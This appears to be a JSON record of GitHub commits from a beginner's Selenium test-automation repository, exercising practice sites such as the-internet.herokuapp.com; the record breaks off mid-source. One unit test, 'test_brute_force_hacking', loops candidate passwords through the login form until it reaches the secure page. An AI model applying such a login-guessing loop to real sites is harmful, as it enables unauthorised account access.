{"https:\/\/github.com\/MaximDigitalKL\/Python_code_and_automation":{"66ebe4edec177bd6ff592d879d8e3edf3016a408":{"url":"https:\/\/api.github.com\/repos\/MaximDigitalKL\/Python_code_and_automation\/commits\/66ebe4edec177bd6ff592d879d8e3edf3016a408","html_url":"https:\/\/github.com\/MaximDigitalKL\/Python_code_and_automation\/commit\/66ebe4edec177bd6ff592d879d8e3edf3016a408","sha":"66ebe4edec177bd6ff592d879d8e3edf3016a408","keyword":"brute force update","diff":"diff --git a\/unittests\/random_unit_tests.py b\/unittests\/random_unit_tests.py\nindex 93b6e15..449f8d2 100644\n--- a\/unittests\/random_unit_tests.py\n+++ b\/unittests\/random_unit_tests.py\n@@ -15,6 +15,9 @@ class Tests1(unittest.TestCase):\n     ERROR = (By.XPATH, '\/\/div[@class=\"row\"]\/div\/div[@id=\"flash\"]')\n     ERROR_MESSAGE = (By.XPATH,'\/\/div[@class=\"row\"]\/div\/div[@id=\"flash\"]')\n     CLOSE_ERROR = (By.XPATH, '\/\/div[@id=\"flash\"]\/a')\n+    SUCCESS = (By.XPATH, '\/\/h2')\n+    USERNAME = (By.ID,\"username\")\n+    PASSWORD = (By.ID, \"password\")\n \n \n \n@@ -107,24 +110,18 @@ def test_return_validation(self):\n \n #-Brute force password hacking (consider each word of element \/\/h4 a password)\n     def test_brute_force_hacking(self):\n-        self.chrome.find_element(By.ID, 'username').send_keys('tomsmith')\n-        h4_text = self.chrome.find_element(By.XPATH,'\/\/h4').text\n-        pass_list = h4_text.split()\n-        found = False\n-        for i in range(len(pass_list)):\n-            self.chrome.find_element(By.ID, 'password').send_keys(pass_list[i])\n+        pass_list = self.chrome.find_element(By.XPATH, '\/\/h4').text.split()\n+        P_found = False\n+        for word in pass_list:\n+            self.chrome.find_element(*self.USERNAME).send_keys('tomsmith')\n+            self.chrome.find_element(*self.PASSWORD).send_keys(word)\n             self.chrome.find_element(*self.BUTTON).click()\n-            try:\n-                self.chrome.find_element(*self.ERROR)\n-                self.chrome.find_element(By.ID, 'username').send_keys('tomsmith')\n-            except:\n-                the_password = pass_list[i]\n-                found = True\n+            login_confirmation = self.chrome.find_element(*self.SUCCESS).text\n+            if login_confirmation == \"Secure Area\":\n+                P_found = True\n+                print(f'The secret password is: {word}')\n                 break\n-        if found == True:\n-            print(f'The secret password is: {the_password}')\n-        else:\n-            print('The password could not be hacked')\n+        assert P_found == True, \"The password could not be hacked\"\n \n \n \n","message":"","files":{"\/unittests\/random_unit_tests.py":{"changes":[{"diff":"\n \n #-Brute force password hacking (consider each word of element \/\/h4 a password)\n     def test_brute_force_hacking(self):\n-        self.chrome.find_element(By.ID, 'username').send_keys('tomsmith')\n-        h4_text = self.chrome.find_element(By.XPATH,'\/\/h4').text\n-        pass_list = h4_text.split()\n-        found = False\n-        for i in range(len(pass_list)):\n-            self.chrome.find_element(By.ID, 'password').send_keys(pass_list[i])\n+        pass_list = self.chrome.find_element(By.XPATH, '\/\/h4').text.split()\n+        P_found = False\n+        for word in pass_list:\n+            self.chrome.find_element(*self.USERNAME).send_keys('tomsmith')\n+            self.chrome.find_element(*self.PASSWORD).send_keys(word)\n             self.chrome.find_element(*self.BUTTON).click()\n-            try:\n-                self.chrome.find_element(*self.ERROR)\n-                self.chrome.find_element(By.ID, 'username').send_keys('tomsmith')\n-            except:\n-                the_password = pass_list[i]\n-                found = True\n+            login_confirmation = self.chrome.find_element(*self.SUCCESS).text\n+            if login_confirmation == \"Secure Area\":\n+                P_found = True\n+                print(f'The secret password is: {word}')\n                 break\n-        if found == True:\n-            print(f'The secret password is: {the_password}')\n-        else:\n-            print('The password could not be hacked')\n+        assert P_found == True, \"The password could not be hacked\"\n \n \n \n","add":10,"remove":16,"filename":"\/unittests\/random_unit_tests.py","badparts":["        self.chrome.find_element(By.ID, 'username').send_keys('tomsmith')","        h4_text = self.chrome.find_element(By.XPATH,'\/\/h4').text","        pass_list = h4_text.split()","        found = False","        for i in range(len(pass_list)):","            self.chrome.find_element(By.ID, 'password').send_keys(pass_list[i])","            try:","                self.chrome.find_element(*self.ERROR)","                self.chrome.find_element(By.ID, 'username').send_keys('tomsmith')","            except:","                the_password = pass_list[i]","                found = True","        if found == True:","            print(f'The secret password is: {the_password}')","        else:","            print('The password could not be hacked')"],"goodparts":["        pass_list = self.chrome.find_element(By.XPATH, '\/\/h4').text.split()","        P_found = False","        for word in pass_list:","            self.chrome.find_element(*self.USERNAME).send_keys('tomsmith')","            self.chrome.find_element(*self.PASSWORD).send_keys(word)","            login_confirmation = self.chrome.find_element(*self.SUCCESS).text","            if login_confirmation == \"Secure Area\":","                P_found = True","                print(f'The secret password is: {word}')","        assert P_found == True, \"The password could not be hacked\""]}],"source":"\nimport time import unittest from selenium import webdriver from selenium.webdriver.common.by import By from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC class Tests1(unittest.TestCase): NEW_URL=\"https:\/\/the-internet.herokuapp.com\/login\" ELEMENT=(By.XPATH,'\/\/h2') BUTTON=(By.XPATH,'\/\/button') LINK_ATTRIBUTE=(By.XPATH,'\/\/div[@id=\"page-footer\"]\/div\/div\/a') ERROR=(By.XPATH, '\/\/div[@class=\"row\"]\/div\/div[@id=\"flash\"]') ERROR_MESSAGE=(By.XPATH,'\/\/div[@class=\"row\"]\/div\/div[@id=\"flash\"]') CLOSE_ERROR=(By.XPATH, '\/\/div[@id=\"flash\"]\/a') def setUp(self) -> None: self.chrome=webdriver.Chrome() self.chrome.maximize_window() self.chrome.get('https:\/\/the-internet.herokuapp.com\/') self.chrome.find_element(By.LINK_TEXT,'Form Authentication').click() self.chrome.implicitly_wait(3) def tearDown(self) -> None: self.chrome.quit def test_The_Correct_URL(self): actual_url=self.chrome.current_url assert self.NEW_URL==actual_url, \"Error, Invalid URL\" def test_Verify_Page_Title(self): assert self.chrome.title==\"The Internet\", f'Error, invalid Page Title!' def test_xpath_element(self): expected_text=\"Login Page\" actual_text=self.chrome.find_element(*self.ELEMENT).text assert expected_text==actual_text, f'Error, expected text{expected_text},' \\ f'retrieved text{actual_text}' def test_login_button(self): assert self.chrome.find_element(*self.BUTTON).is_displayed()==True, f'Error, \"Login Button\" is not displayed' def test_Elemental_Selenium(self): attribute=self.chrome.find_element(*self.LINK_ATTRIBUTE) assert hasattr(attribute,'_parent')==True, 'Error, invalid attribute' def test_login_without_credentials(self): self.chrome.find_element(*self.BUTTON).click() assert self.chrome.find_element(*self.ERROR).is_displayed()==True, 'Error, Alert is not displayed' def test_error_message(self): self.chrome.find_element(By.ID, 'username').send_keys('Jimmy') self.chrome.find_element(By.ID, 'password').send_keys('Boy') self.chrome.find_element(*self.BUTTON).click() expected_message=\"Your username is invalid\" actual_message=self.chrome.find_element(*self.ERROR_MESSAGE).text self.assertTrue(expected_message in actual_message, 'Error message is incorrect') def test_close_allert(self): self.chrome.find_element(*self.BUTTON).click() self.chrome.find_element(*self.CLOSE_ERROR).click() try: self.chrome.find_element(*self.ERROR) except: print('Error is no longer displayed') def test_label_text(self): list=self.chrome.find_elements(By.XPATH,'\/\/label') first_text=list[0].text assert first_text==\"Username\", f'Error, expected Username, retrieved{first_text}' second_text=list[1].text assert second_text==\"Password\", f'Error, expected Password, retrieved{second_text}' def test_validation(self): self.chrome.find_element(By.ID, 'username').send_keys('tomsmith') self.chrome.find_element(By.ID, 'password').send_keys('SuperSecretPassword!') self.chrome.find_element(*self.BUTTON).click() url=self.chrome.current_url self.assertTrue(\"secure\" in url, 'Error, \"secure\" is not in URL') confirmation_element=WebDriverWait(self.chrome,1).until(EC.presence_of_element_located((By.XPATH,'\/\/div[@class=\"flash success\"]'))) assert confirmation_element.is_displayed()==True, f'Error, the element is not displayed' def test_return_validation(self): self.chrome.find_element(By.ID, 'username').send_keys('tomsmith') self.chrome.find_element(By.ID, 'password').send_keys('SuperSecretPassword!') self.chrome.find_element(*self.BUTTON).click() self.chrome.find_element(By.XPATH,'\/\/a[@class=\"button secondary radius\"]').click() assert self.chrome.current_url==\"https:\/\/the-internet.herokuapp.com\/login\", 'Error, invalid URL' def test_brute_force_hacking(self): self.chrome.find_element(By.ID, 'username').send_keys('tomsmith') h4_text=self.chrome.find_element(By.XPATH,'\/\/h4').text pass_list=h4_text.split() found=False for i in range(len(pass_list)): self.chrome.find_element(By.ID, 'password').send_keys(pass_list[i]) self.chrome.find_element(*self.BUTTON).click() try: self.chrome.find_element(*self.ERROR) self.chrome.find_element(By.ID, 'username').send_keys('tomsmith') except: the_password=pass_list[i] found=True break if found==True: print(f'The secret password is:{the_password}') else: print('The password could not be hacked') ","sourceWithComments":"import time\nimport unittest\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.by import By\nfrom selenium.webdriver.support.ui import WebDriverWait\nfrom selenium.webdriver.support import expected_conditions as EC\n\nclass Tests1(unittest.TestCase):\n\n    NEW_URL = \"https:\/\/the-internet.herokuapp.com\/login\"\n    ELEMENT = (By.XPATH,'\/\/h2')\n    BUTTON = (By.XPATH,'\/\/button')\n    LINK_ATTRIBUTE = (By.XPATH,'\/\/div[@id=\"page-footer\"]\/div\/div\/a')\n    ERROR = (By.XPATH, '\/\/div[@class=\"row\"]\/div\/div[@id=\"flash\"]')\n    ERROR_MESSAGE = (By.XPATH,'\/\/div[@class=\"row\"]\/div\/div[@id=\"flash\"]')\n    CLOSE_ERROR = (By.XPATH, '\/\/div[@id=\"flash\"]\/a')\n\n\n\n\n    def setUp(self) -> None:\n        self.chrome = webdriver.Chrome()\n        self.chrome.maximize_window()\n        self.chrome.get('https:\/\/the-internet.herokuapp.com\/')\n        self.chrome.find_element(By.LINK_TEXT,'Form Authentication').click()\n        self.chrome.implicitly_wait(3)\n\n    def tearDown(self) -> None:\n        self.chrome.quit\n\n#- Verify new URL is correct\n    def test_The_Correct_URL(self):\n        actual_url = self.chrome.current_url\n        assert self.NEW_URL == actual_url, \"Error, Invalid URL\"\n\n#- Verific\u0103 if page title is correct\n    def test_Verify_Page_Title(self):\n        assert self.chrome.title == \"The Internet\", f'Error, invalid Page Title!'\n\n#- Verify if text from element xpath=\/\/h2 is correct\n    def test_xpath_element(self):\n        expected_text = \"Login Page\"\n        actual_text = self.chrome.find_element(*self.ELEMENT).text\n        assert expected_text == actual_text, f'Error, expected text {expected_text},' \\\n                                             f'retrieved text {actual_text}'\n#- Verify if Login Button is displayed\n    def test_login_button(self):\n        assert self.chrome.find_element(*self.BUTTON).is_displayed() == True, f'Error, \"Login Button\" is not displayed'\n\n#- Verify if atribute of href link 'Elemental Selenium' is correct\n    def test_Elemental_Selenium(self):\n        attribute = self.chrome.find_element(*self.LINK_ATTRIBUTE)\n        assert hasattr(attribute,'_parent') == True, 'Error, invalid attribute'\n\n#- Leave user and pass empty, press login, verify if error is displayed\n    def test_login_without_credentials(self):\n        self.chrome.find_element(*self.BUTTON).click()\n        assert self.chrome.find_element(*self.ERROR).is_displayed() == True, 'Error, Alert is not displayed'\n\n#- Fill in invalid user and pass, press login, verify if error message is correct\n    def test_error_message(self):\n        self.chrome.find_element(By.ID, 'username').send_keys('Jimmy')\n        self.chrome.find_element(By.ID, 'password').send_keys('Boy')\n        self.chrome.find_element(*self.BUTTON).click()\n        expected_message = \"Your username is invalid\"\n        actual_message = self.chrome.find_element(*self.ERROR_MESSAGE).text\n        self.assertTrue(expected_message in actual_message, 'Error message is incorrect')\n\n# - Leave user and pass empty, press login, press \"x\" on the error, check if the error has dissapeared\n    def test_close_allert(self):\n        self.chrome.find_element(*self.BUTTON).click()\n        self.chrome.find_element(*self.CLOSE_ERROR).click()\n        try:\n            self.chrome.find_element(*self.ERROR)\n        except:\n            print('Error is no longer displayed')\n\n\n# - Take all \/\/label as a list, verify each label text to be the ones expected (Username\/ Password)\n    def test_label_text(self):\n        list = self.chrome.find_elements(By.XPATH,'\/\/label')\n        first_text = list[0].text\n        assert first_text == \"Username\", f'Error, expected Username, retrieved {first_text}'\n        second_text = list[1].text\n        assert second_text == \"Password\", f'Error, expected Password, retrieved {second_text}'\n\n#- Fill in valid user and pass, press login, verify new URL contains \"secure\".\n    # Use explicit wait for element with class \"flash success\"\n    # Verify if the element is dispalyed\n    def test_validation(self):\n        self.chrome.find_element(By.ID, 'username').send_keys('tomsmith')\n        self.chrome.find_element(By.ID, 'password').send_keys('SuperSecretPassword!')\n        self.chrome.find_element(*self.BUTTON).click()\n        url = self.chrome.current_url\n        self.assertTrue(\"secure\" in url, 'Error, \"secure\" is not in URL')\n        confirmation_element = WebDriverWait(self.chrome,1).until(EC.presence_of_element_located((By.XPATH,'\/\/div[@class=\"flash success\"]')))\n        assert confirmation_element.is_displayed() == True, f'Error, the element is not displayed'\n\n# -Fill in valid user and pass, click login, click logout, verify is URL is: https:\/\/the-internet.herokuapp.com\/login\n    def test_return_validation(self):\n        self.chrome.find_element(By.ID, 'username').send_keys('tomsmith')\n        self.chrome.find_element(By.ID, 'password').send_keys('SuperSecretPassword!')\n        self.chrome.find_element(*self.BUTTON).click()\n        self.chrome.find_element(By.XPATH,'\/\/a[@class=\"button secondary radius\"]').click()\n        assert self.chrome.current_url == \"https:\/\/the-internet.herokuapp.com\/login\", 'Error, invalid URL'\n\n#-Brute force password hacking (consider each word of element \/\/h4 a password)\n    def test_brute_force_hacking(self):\n        self.chrome.find_element(By.ID, 'username').send_keys('tomsmith')\n        h4_text = self.chrome.find_element(By.XPATH,'\/\/h4').text\n        pass_list = h4_text.split()\n        found = False\n        for i in range(len(pass_list)):\n            self.chrome.find_element(By.ID, 'password').send_keys(pass_list[i])\n            self.chrome.find_element(*self.BUTTON).click()\n            try:\n                self.chrome.find_element(*self.ERROR)\n                self.chrome.find_element(By.ID, 'username').send_keys('tomsmith')\n            except:\n                the_password = pass_list[i]\n                found = True\n                break\n        if found == True:\n            print(f'The secret password is: {the_password}')\n        else:\n            print('The password could not be hacked')\n\n\n\n\n\n\n"}},"msg":"brute force update"},"387a4f5aa0f9dcedfb06e4c92b093032b05c3f92":{"url":"https:\/\/api.github.com\/repos\/MaximDigitalKL\/Python_code_and_automation\/commits\/387a4f5aa0f9dcedfb06e4c92b093032b05c3f92","html_url":"https:\/\/github.com\/MaximDigitalKL\/Python_code_and_automation\/commit\/387a4f5aa0f9dcedfb06e4c92b093032b05c3f92","message":"brute force update","sha":"387a4f5aa0f9dcedfb06e4c92b093032b05c3f92","keyword":"brute force update","diff":"diff --git a\/10Slectors_Webdriver.py b\/10Slectors_Webdriver.py\nindex 76e2220..7f6375a 100644\n--- a\/10Slectors_Webdriver.py\n+++ b\/10Slectors_Webdriver.py\n@@ -6,22 +6,22 @@\n \n chrome = webdriver.Chrome()\n chrome.maximize_window()\n-time.sleep(2)\n+\n chrome.get(\"https:\/\/formy-project.herokuapp.com\/\")\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT, \"Enabled and disabled elements\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.ID,\"input\").send_keys(\"calculator\")\n-time.sleep(2)\n+\n chrome.find_element(By.CLASS_NAME,\"navbar-brand\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Checkbox\").click()\n-time.sleep(1)\n+\n chrome.find_element(By.ID,\"checkbox-2\").click()\n-time.sleep(2)\n+\n chrome.back()\n chrome.find_element(By.LINK_TEXT,\"Autocomplete\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.ID,\"autocomplete\").send_keys(\"Muntii Godeanu\")\n address = chrome.find_elements(By.CLASS_NAME,\"form-control\")\n address[1].send_keys(\"nr 20\")\n@@ -29,62 +29,62 @@\n address[4].send_keys(\"Cluj\")\n address[5].send_keys(\"407205\")\n address[6].send_keys(\"Romania\")\n-time.sleep(3)\n+\n chrome.back()\n-time.sleep(1)\n+\n chrome.get(\"https:\/\/the-internet.herokuapp.com\/\")\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Dynamic Controls\").click()\n chrome.find_element(By.TAG_NAME,\"input\").click()\n-time.sleep(3)\n+\n chrome.find_element(By.LINK_TEXT,\"Elemental Selenium\").click()\n-time.sleep(2)\n+\n chwd = chrome.window_handles\n chrome.switch_to.window(chwd[1])\n-time.sleep(2)\n+\n chrome.find_element(By.NAME,\"fields[programming_language]\").click()\n-time.sleep(1)\n+\n optiuni = chrome.find_elements(By.TAG_NAME,\"option\")\n optiuni[4].click()\n-time.sleep(4)\n+\n chrome.get(\"http:\/\/www.seleniumframework.com\/Practiceform\/\")\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Browser Commands\").click()\n-time.sleep(2)\n+\n chrome.get(\"https:\/\/the-internet.herokuapp.com\/\")\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Challenging DOM\").click()\n-time.sleep(2)\n+\n word = chrome.find_element(By.XPATH,\"\/\/table\/tbody\/tr[3]\/td[4]\").text\n chrome.back()\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Form Authentication\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.NAME,\"username\").send_keys(word)\n-time.sleep(3)\n+\n chrome.back()\n-time.sleep(2)\n+\n chrome.find_element(By.PARTIAL_LINK_TEXT,\"Chall\").click()\n-time.sleep(2)\n+\n chrome.back()\n-time.sleep(2)\n+\n chrome.find_element(By.PARTIAL_LINK_TEXT,\"Geo\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.TAG_NAME,\"button\").click()\n chrome.back()\n-time.sleep(2)\n+\n chrome.find_element(By.PARTIAL_LINK_TEXT,\"Form\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.NAME,\"username\").send_keys(\"maxim\")\n chrome.find_element(By.NAME,\"password\").send_keys(\"razvan\")\n-time.sleep(2)\n+\n chrome.find_element(By.CLASS_NAME,\"radius\").click()\n chrome.get(\"https:\/\/formy-project.herokuapp.com\/\")\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Key and Mouse Press\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.TAG_NAME,\"input\").send_keys(\"THE END!\")\n-time.sleep(3)\n+\n \n \n \ndiff --git a\/CSS_Selectors.py b\/CSS_Selectors.py\nindex b5a371b..b38d0bd 100644\n--- a\/CSS_Selectors.py\n+++ b\/CSS_Selectors.py\n@@ -11,4 +11,4 @@\n chrome.find_element(By.CSS_SELECTOR,\"#username\").send_keys(\"tomsmith\")\n chrome.find_element(By.CSS_SELECTOR,'input[type=\"password\"]').send_keys(\"SuperSecretPassword!\")\n chrome.find_element(By.CSS_SELECTOR,'.radius').click()\n-time.sleep(3)\n+\ndiff --git a\/unittests\/random_unit_tests.py b\/unittests\/random_unit_tests.py\nindex 449f8d2..c785633 100644\n--- a\/unittests\/random_unit_tests.py\n+++ b\/unittests\/random_unit_tests.py\n@@ -20,8 +20,6 @@ class Tests1(unittest.TestCase):\n     PASSWORD = (By.ID, \"password\")\n \n \n-\n-\n     def setUp(self) -> None:\n         self.chrome = webdriver.Chrome()\n         self.chrome.maximize_window()\ndiff --git a\/unittests\/test.py b\/unittests\/test.py\nnew file mode 100644\nindex 0000000..8b0a926\n--- \/dev\/null\n+++ b\/unittests\/test.py\n@@ -0,0 +1,44 @@\n+import time\n+import unittest\n+from selenium import webdriver\n+from selenium.webdriver.common.by import By\n+from selenium.webdriver.support.ui import WebDriverWait\n+from selenium.webdriver.support import expected_conditions as EC\n+\n+class Tests22(unittest.TestCase):\n+\n+    NEW_URL = \"https:\/\/the-internet.herokuapp.com\/login\"\n+    ELEMENT = (By.XPATH,'\/\/h2')\n+    BUTTON = (By.XPATH,'\/\/button')\n+    LINK_ATTRIBUTE = (By.XPATH,'\/\/div[@id=\"page-footer\"]\/div\/div\/a')\n+    ERROR = (By.XPATH, '\/\/div[@class=\"row\"]\/div\/div[@id=\"flash\"]')\n+    ERROR_MESSAGE = (By.XPATH,'\/\/div[@class=\"row\"]\/div\/div[@id=\"flash\"]')\n+    CLOSE_ERROR = (By.XPATH, '\/\/div[@id=\"flash\"]\/a')\n+    SUCCESS = (By.XPATH, '\/\/h2')\n+    USERNAME = (By.ID,\"username\")\n+    PASSWORD = (By.ID, \"password\")\n+    CHOOSE_FILE = (By.XPATH, '\/\/input[@type=\"file\"]')\n+    #CHOOSE_FILE = (By.XPATH, '\/\/input[@id=\"file-upload\"]')\n+    COOKIES = (By.XPATH,'\/\/div[@class=\"col-12\"]\/p\/a[@class=\"_brlbs-btn _brlbs-btn-accept-all _brlbs-cursor\"]')\n+\n+    def setUp(self) -> None:\n+        self.chrome = webdriver.Chrome()\n+        self.chrome.maximize_window()\n+        self.chrome.get('https:\/\/the-internet.herokuapp.com\/upload')\n+        self.chrome.implicitly_wait(3)\n+\n+    def tearDown(self) -> None:\n+        self.chrome.quit\n+\n+    def test_upload_CV(self):\n+        try:\n+            self.chrome.find_element(*self.COOKIES).click()\n+        except:\n+            pass\n+        self.chrome.find_element(*self.CHOOSE_FILE).send_keys(\"C:\/Users\/Maxim\/Desktop\/Dummy_CV.pdf\")\n+        time.sleep(10)\n+\n+\n+\n+\n+\ndiff --git a\/xpath_selector.py b\/xpath_selector.py\nindex ff987d4..1aee160 100644\n--- a\/xpath_selector.py\n+++ b\/xpath_selector.py\n@@ -8,35 +8,35 @@\n chrome.get(\"https:\/\/the-internet.herokuapp.com\/\")\n chrome.implicitly_wait(5)\n chrome.find_element(By.XPATH,\"\/\/ul\/li[6]\/a\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,\"\/\/input[1]\").click()\n chrome.find_element(By.XPATH,\"\/\/input[2]\").click()\n-time.sleep(2)\n+\n chrome.back()\n chrome.find_element(By.XPATH,\"\/\/ul\/li[15]\/a\").click()\n-time.sleep(2)\n+\n chrome.switch_to.active_element.click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/*[@id=\"restart-ad\"]').click()\n-time.sleep(2)\n+\n chrome.switch_to.active_element.click()\n chrome.back()\n-time.sleep(2)\n+\n chrome.get(\"https:\/\/www.flashscore.ro\/\")\n chrome.find_element(By.XPATH,'\/\/*[@id=\"my-leagues-list\"]\/div[1]\/div[1]\/a\/span[2]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@class=\"tabs__group\"]\/a[text()=\"Rezultate\"]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@class=\"menuTop__items\"]\/a[1]\/div[text()=\"Fotbal\"]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@class=\"calendar__datepicker \"]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@class=\"calendar__days\"]\/div[text()=\"10\/12 S\u00e2\"]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@class=\"event__header top\"]\/div[2]\/div[1]\/span[text()=\"Cupa Mondial\u0103 - Play-off\"]').click()\n-time.sleep(2)\n+\n chrome.find_element(By.XPATH,'\/\/div[@id=\"g_1_2g49AZK4\"]\/div[2]').click()\n-time.sleep(2)\n+\n chwd = chrome.window_handles\n chrome.switch_to.window(chwd[1])\n chrome.maximize_window()\n","files":{"\/10Slectors_Webdriver.py":{"changes":[{"diff":"\n \n chrome = webdriver.Chrome()\n chrome.maximize_window()\n-time.sleep(2)\n+\n chrome.get(\"https:\/\/formy-project.herokuapp.com\/\")\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT, \"Enabled and disabled elements\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.ID,\"input\").send_keys(\"calculator\")\n-time.sleep(2)\n+\n chrome.find_element(By.CLASS_NAME,\"navbar-brand\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Checkbox\").click()\n-time.sleep(1)\n+\n chrome.find_element(By.ID,\"checkbox-2\").click()\n-time.sleep(2)\n+\n chrome.back()\n chrome.find_element(By.LINK_TEXT,\"Autocomplete\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.ID,\"autocomplete\").send_keys(\"Muntii Godeanu\")\n address = chrome.find_elements(By.CLASS_NAME,\"form-control\")\n address[1].send_keys(\"nr 20\")\n","add":8,"remove":8,"filename":"\/10Slectors_Webdriver.py","badparts":["time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(1)","time.sleep(2)","time.sleep(2)"],"goodparts":[]},{"diff":" address[4].send_keys(\"Cluj\")\n address[5].send_keys(\"407205\")\n address[6].send_keys(\"Romania\")\n-time.sleep(3)\n+\n chrome.back()\n-time.sleep(1)\n+\n chrome.get(\"https:\/\/the-internet.herokuapp.com\/\")\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Dynamic Controls\").click()\n chrome.find_element(By.TAG_NAME,\"input\").click()\n-time.sleep(3)\n+\n chrome.find_element(By.LINK_TEXT,\"Elemental Selenium\").click()\n-time.sleep(2)\n+\n chwd = chrome.window_handles\n chrome.switch_to.window(chwd[1])\n-time.sleep(2)\n+\n chrome.find_element(By.NAME,\"fields[programming_language]\").click()\n-time.sleep(1)\n+\n optiuni = chrome.find_elements(By.TAG_NAME,\"option\")\n optiuni[4].click()\n-time.sleep(4)\n+\n chrome.get(\"http:\/\/www.seleniumframework.com\/Practiceform\/\")\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Browser Commands\").click()\n-time.sleep(2)\n+\n chrome.get(\"https:\/\/the-internet.herokuapp.com\/\")\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Challenging DOM\").click()\n-time.sleep(2)\n+\n word = chrome.find_element(By.XPATH,\"\/\/table\/tbody\/tr[3]\/td[4]\").text\n chrome.back()\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Form Authentication\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.NAME,\"username\").send_keys(word)\n-time.sleep(3)\n+\n chrome.back()\n-time.sleep(2)\n+\n chrome.find_element(By.PARTIAL_LINK_TEXT,\"Chall\").click()\n-time.sleep(2)\n+\n chrome.back()\n-time.sleep(2)\n+\n chrome.find_element(By.PARTIAL_LINK_TEXT,\"Geo\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.TAG_NAME,\"button\").click()\n chrome.back()\n-time.sleep(2)\n+\n chrome.find_element(By.PARTIAL_LINK_TEXT,\"Form\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.NAME,\"username\").send_keys(\"maxim\")\n chrome.find_element(By.NAME,\"password\").send_keys(\"razvan\")\n-time.sleep(2)\n+\n chrome.find_element(By.CLASS_NAME,\"radius\").click()\n chrome.get(\"https:\/\/formy-project.herokuapp.com\/\")\n-time.sleep(2)\n+\n chrome.find_element(By.LINK_TEXT,\"Key and Mouse Press\").click()\n-time.sleep(2)\n+\n chrome.find_element(By.TAG_NAME,\"input\").send_keys(\"THE END!\")\n-time.sleep(3)\n+\n \n \n ","add":25,"remove":25,"filename":"\/10Slectors_Webdriver.py","badparts":["time.sleep(3)","time.sleep(1)","time.sleep(2)","time.sleep(3)","time.sleep(2)","time.sleep(2)","time.sleep(1)","time.sleep(4)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(3)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(2)","time.sleep(3)"],"goodparts":[]}],"source":"\nimport time import action as action from selenium import webdriver from selenium.webdriver.common.by import By chrome=webdriver.Chrome() chrome.maximize_window() time.sleep(2) chrome.get(\"https:\/\/formy-project.herokuapp.com\/\") time.sleep(2) chrome.find_element(By.LINK_TEXT, \"Enabled and disabled elements\").click() time.sleep(2) chrome.find_element(By.ID,\"input\").send_keys(\"calculator\") time.sleep(2) chrome.find_element(By.CLASS_NAME,\"navbar-brand\").click() time.sleep(2) chrome.find_element(By.LINK_TEXT,\"Checkbox\").click() time.sleep(1) chrome.find_element(By.ID,\"checkbox-2\").click() time.sleep(2) chrome.back() chrome.find_element(By.LINK_TEXT,\"Autocomplete\").click() time.sleep(2) chrome.find_element(By.ID,\"autocomplete\").send_keys(\"Muntii Godeanu\") address=chrome.find_elements(By.CLASS_NAME,\"form-control\") address[1].send_keys(\"nr 20\") address[3].send_keys(\"Chinteni\") address[4].send_keys(\"Cluj\") address[5].send_keys(\"407205\") address[6].send_keys(\"Romania\") time.sleep(3) chrome.back() time.sleep(1) chrome.get(\"https:\/\/the-internet.herokuapp.com\/\") time.sleep(2) chrome.find_element(By.LINK_TEXT,\"Dynamic Controls\").click() chrome.find_element(By.TAG_NAME,\"input\").click() time.sleep(3) chrome.find_element(By.LINK_TEXT,\"Elemental Selenium\").click() time.sleep(2) chwd=chrome.window_handles chrome.switch_to.window(chwd[1]) time.sleep(2) chrome.find_element(By.NAME,\"fields[programming_language]\").click() time.sleep(1) optiuni=chrome.find_elements(By.TAG_NAME,\"option\") optiuni[4].click() time.sleep(4) chrome.get(\"http:\/\/www.seleniumframework.com\/Practiceform\/\") time.sleep(2) chrome.find_element(By.LINK_TEXT,\"Browser Commands\").click() time.sleep(2) chrome.get(\"https:\/\/the-internet.herokuapp.com\/\") time.sleep(2) chrome.find_element(By.LINK_TEXT,\"Challenging DOM\").click() time.sleep(2) word=chrome.find_element(By.XPATH,\"\/\/table\/tbody\/tr[3]\/td[4]\").text chrome.back() time.sleep(2) chrome.find_element(By.LINK_TEXT,\"Form Authentication\").click() time.sleep(2) chrome.find_element(By.NAME,\"username\").send_keys(word) time.sleep(3) chrome.back() time.sleep(2) chrome.find_element(By.PARTIAL_LINK_TEXT,\"Chall\").click() time.sleep(2) chrome.back() time.sleep(2) 